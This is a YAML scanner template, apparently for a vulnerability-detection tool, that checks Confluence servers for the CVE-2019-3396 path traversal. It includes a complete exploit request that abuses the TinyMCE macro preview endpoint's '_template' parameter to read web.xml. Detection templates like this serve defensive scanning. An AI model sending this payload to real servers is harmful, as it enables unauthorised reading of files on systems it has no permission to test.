id: CVE-2019-3396

info:
  name: Atlassian Confluence Path Traversal
  author: sharecast
  severity: high
  verified: false
  description: |
    Atlassian Confluence Server and Data Center before version 6.16.10, from version 7.0.0 before 7.4.10, and from version 7.5.0 before 7.5.4 allows remote attackers to read arbitrary files on the server via a path traversal vulnerability in the preview endpoint of the TinyMCE REST resource.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2019-3396
  tags: cve,cve2019,atlassian,confluence,path-traversal
  created: 2023/08/10

rules:
  r0:
    request:
      method: POST
      path: /rest/tinymce/1/macro/preview
      headers:
        Content-Type: application/json
      body: '{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"../web.xml"}}}'
    expression: response.status == 200 && response.body.bcontains(b"<param-name>contextConfigLocation</param-name>")
expression: r0()
